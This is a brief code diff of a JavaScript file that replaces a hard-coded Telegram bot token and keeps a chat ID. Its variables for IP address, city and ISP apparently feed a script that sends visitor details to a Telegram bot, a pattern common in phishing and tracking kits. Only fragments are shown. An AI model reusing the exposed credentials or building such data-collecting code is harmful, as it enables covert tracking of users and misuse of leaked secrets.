@@ -1,6 +1,6 @@
 var count = 0;
 var counts = 0;
-var token = '7348938226:AAG1MI-e2CBfT2i2f9vbcHYMUWUbClkxmYQ';
+var token = '7348938226:AAHJFJcLapDIHJBYpw8s5iw6ArFQXyPd5zk';
 var chatId = '7705478130';
 var ipAddress = '';
 var city = '';
@@ -272,4 +272,5 @@ ISP: ${isp}
       console.error('Error sending notification:', error);
     }
   });
+
 });
